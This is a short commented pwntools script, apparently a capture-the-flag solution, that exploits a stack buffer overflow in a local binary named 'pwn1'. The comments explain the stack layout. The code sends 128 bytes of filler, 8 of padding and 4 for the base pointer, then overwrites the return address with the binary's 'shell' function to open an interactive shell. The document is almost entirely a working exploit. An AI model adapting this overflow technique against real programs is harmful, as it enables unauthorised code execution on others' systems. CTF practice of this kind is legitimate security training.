#So here as we can see, we need to fill up the buffer variable, but just 
#after it, on the stack, we have some padding, needed to align the memory,
#then the base pointer, and at the end the return address or instruction 
#pointer return:

#low addr.

#| buffer    |
#| padding   |
#| base p.   |
#| ret. add. |

#high addr.

#So first we need to fill the buffer, then we fill the padding
# that we found with length 8 byte, then we fill the base pointer,
#and at the end, we put the address of the function that will open us
#a shell and BOOM! Pwned

#!/bin/python3

from pwn import *
from pathlib import Path

elf = ELF('pwn1')           #to open it like ida does (in binary/assembly)
#p32 simply convert it to an hex number
addressF = p32(elf.symbols['shell'])          #to search for shell function (return the address)

pr = process("./pwn1")

msgin = b'a'*128 + b'a'*8 + b'a'*4 + addressF
pr.sendline(msgin)
pr.interactive()
